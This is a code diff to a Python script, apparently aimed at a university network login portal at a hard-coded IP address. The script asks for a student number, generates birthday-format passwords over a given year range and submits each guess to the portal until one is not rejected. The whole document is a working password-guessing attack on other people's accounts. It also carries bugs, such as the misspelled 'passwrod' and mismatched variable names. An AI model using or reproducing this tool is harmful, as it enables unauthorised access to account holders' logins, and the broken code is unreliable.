@@ -23,24 +23,20 @@ def check_password(username,password):
         'n':100}
     url="http://202.112.136.131/cgi-bin/do_login"
     user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36'
+    content_length=len(username)+55
     headers={'User-Agent':user_agent,
-             'Content-Length':64,
+             'Content-Length':content_length,
              'Connection':'keep-alive',
-             'Content-Type':"application/x-www-form-urlencoded"}
+             'Content-Type':"application/x-www-form-urlencoded",
+    }
     formdata=urllib.parse.urlencode(formdata)
     formdata=formdata.encode("gbk")
-    #print("123")
     req=urllib.request.Request(url,headers=headers,data=formdata)
-    #print("123")
     myResponse=urllib.request.urlopen(req)
-    #print("123")
     backcode=myResponse.read()
-    #print(backcode)
     backcode=backcode.decode("gbk")
-    if backcode!='password_error':
-        return True
-    return False
-    # print(backcode)
+    print(backcode)
+    return backcode
 
 def getBirthday(year,mon,day):
     birthday=str(year)
@@ -63,17 +59,16 @@ def getPassword(username,textpass):
                 for k in range(Month_Day[j]):
                     password=getBirthday(i,j,k)
                     print(password)
-                    result=check_password(username,password)
-                    if result==True:
-                        print("登录成功！")
-                        return password
+                    backcode=check_password(username,password)
+                    if backcode=='password_error':
+                        continue
+                    else:
+                        return " ".join([backcode,password])
     else:
         password=str(testpass)
-        result=check_password(username,password)
-        if result==True:
-            print("登录成功！")
-            return password
-    return "wrong password"
+        backcode=check_password(username,password)
+        return ''.join([backcode,passwrod])
+    return "wrong birthday guess"
 
 username=input("请输入学号(字母小写):")
 testpass=input("请输入密码(若未知请输入年份区间 e.g. 1988-1989):")
@@ -81,5 +76,5 @@ testpass=input("请输入密码(若未知请输入年份区间 e.g. 1988-1989):"
 password=getPassword(username,testpass)
 print("用户名:",end=' ')
 print(username)
-print("密码:",end='  ')
+print("result:",end='  ')
 print(password)
